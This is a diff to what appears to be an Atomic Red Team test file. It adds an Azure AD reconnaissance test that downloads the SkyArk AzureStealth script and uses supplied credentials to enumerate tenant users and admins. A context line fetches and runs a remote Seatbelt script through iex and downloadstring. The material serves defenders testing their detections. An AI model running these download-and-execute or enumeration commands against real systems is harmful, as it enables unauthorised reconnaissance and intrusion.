@@ -274,3 +274,54 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
       Invoke-Seatbelt -Command "-group=all"; pause
     name: powershell
+- name: Azure Security Scan with SkyArk
+  auto_generated_guid: 26a18d3d-f8bc-486b-9a33-d6df5d78a594
+  description: |
+    Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. 
+    Once the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. 
+    See https://github.com/cyberark/SkyArk 
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    username:
+      description: Azure AD username
+      type: String
+      default: null
+    password:
+      description: Azure AD password
+      type: String
+      default: T1082Az
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The SkyArk AzureStealth module must exist in $env:temp.
+    prereq_command: |
+      if (test-path $env:temp\AzureStealth.ps1){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1" -outfile "$env:temp\AzureStealth.ps1"
+  - description: |
+      The AzureAD module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name AzureAD -Force
+  - description: |
+      The Az module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name Az -Force
+  executor:
+    command: |
+      Import-Module $env:temp\AzureStealth.ps1 -force      
+      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
+      Connect-AzAccount -Credential $Credential
+      Connect-AzureAD -Credential $Credential
+      Scan-AzureAdmins -UseCurrentCred
+    cleanup_command: |
+      $resultstime = Get-Date -Format "yyyyMMdd"
+      $resultsfolder = ("Results-" + $resultstime)
+      remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: true
